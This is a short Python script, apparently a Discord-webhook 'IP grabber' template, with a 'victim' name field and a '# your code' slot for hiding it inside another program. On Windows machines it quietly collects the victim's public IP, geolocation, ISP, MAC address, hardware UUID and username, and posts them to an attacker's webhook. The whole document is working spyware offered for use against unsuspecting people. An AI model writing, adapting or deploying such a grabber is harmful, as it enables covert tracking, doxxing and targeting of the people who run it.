import os
try:
    import re, uuid, requests, subprocess, os.path, sys, time
    from datetime import datetime
except:
    os.system('pip install -q uiid')
    os.system('pip install -q re')
    os.system('pip install -q datetime')
try:
    import re, uuid, requests, subprocess, os.path, sys
    from datetime import datetime
except:
    sys.exit()
if os.name != "nt":
    sys.exit()
    
#config
hook = "ENTER_WEBHOOK"
victim = "VICTIM_NAME"
ping = "@everyone" #Leave blank for no ping

#grabber
def grabber():
    try:
        ip = requests.get('https://api.ipify.org/').text
        data = requests.get(f"http://ip-api.com/json/{ip}").json()
        hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(r'\\r\\n')[1].strip(r'\\r').strip()
        requests.post(hook, json={"content": f"{ping}","embeds": [{"title": f"{victim} | IP: {ip}","description": f"**Location**"f"```python\nCountry: {data['country']} |  Region: {data['regionName']} | City: {data['city']}\nLat: {data['lat']} | Lon: {data['lon']}\nISP: {data['isp']}ORG: {data['org']}\nAS: {data['as']}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\nHWID: {hwid}\nPC-USER: {os.path.expanduser('~')[9:]}```**Execution time:** ```python\n{round(time.time()-start, 2)} sec\n```**Time Grabbed:**```python\n{datetime.now()} \n```","color": 5814783,"footer": {"text": "IP GRABBER BY Whaxor#9999","icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"},"timestamp": str(datetime.utcnow())}]})
    except:
        requests.post(hook, json={"content": f"Failed to grab {victim}"})

#start
if __name__ == "__main__":
    start = time.time()
    grabber()

    # your code
